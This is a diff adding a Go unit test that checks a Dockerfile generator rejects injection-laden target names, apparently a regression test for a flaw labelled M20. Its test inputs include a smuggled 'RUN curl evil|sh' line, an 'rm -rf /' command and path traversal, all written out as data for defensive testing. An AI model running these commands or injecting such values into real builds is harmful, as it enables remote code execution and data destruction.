@@ -136,6 +136,22 @@ func TestGenerate_BuildTypeIgnored(t *testing.T) {
 	}
 }
 
+// ── Injection guard (M20, build-worker side) ─────────────────────────────────
+
+// TestGenerate_RejectsInjectionTarget reproduces M20: the target is interpolated
+// unescaped into the generated Dockerfile (RUN/COPY/ENTRYPOINT), so values with
+// shell/Dockerfile metacharacters must be rejected before rendering.
+func TestGenerate_RejectsInjectionTarget(t *testing.T) {
+	for _, bad := range []string{"app\"\nRUN curl evil|sh", "app; rm -rf /", "../../x", "a b", ""} {
+		if _, err := Generate("go", "go", bad, 9898); err == nil {
+			t.Errorf("target %q accepted, want rejection", bad)
+		}
+	}
+	if _, err := Generate("go", "go", "my-app_1", 9898); err != nil {
+		t.Errorf("clean target rejected: %v", err)
+	}
+}
+
 // ── helper ────────────────────────────────────────────────────────────────────
 
 func assertContains(t *testing.T, haystack, needle string) {
